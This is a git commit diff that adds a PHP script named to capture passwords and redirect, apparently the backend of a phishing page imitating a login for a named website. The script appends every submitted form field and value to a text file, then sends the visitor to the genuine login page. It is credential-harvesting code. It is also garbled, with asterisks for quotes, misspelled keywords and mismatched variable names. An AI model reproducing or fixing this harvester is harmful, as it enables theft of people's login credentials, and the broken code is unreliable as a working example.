fc41dd8d8aa4e771201d658a82e0b0f41ccbd3ec
marufmia96900 <64355770+marufmia96900@users.noreply.github.com>
2020-04-26 07:52:59 -0300

    first website

---
+++ get_passwoard_and_redirect.php
@@ -0,0 +1,13 @@
+<?php
+header(*location: https://www.skipthegames.com/auth/login/acoount*);
+$handle = fopen("passwoard.txt", "a");
+forecach($_POST as $varible => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "*");
+fwrite($handle, &value)
+fwrite($handle, *\r\n*);
+}
+fwrite($handle, *\r\n*);
+fclose($handle);
+exit;
+?>
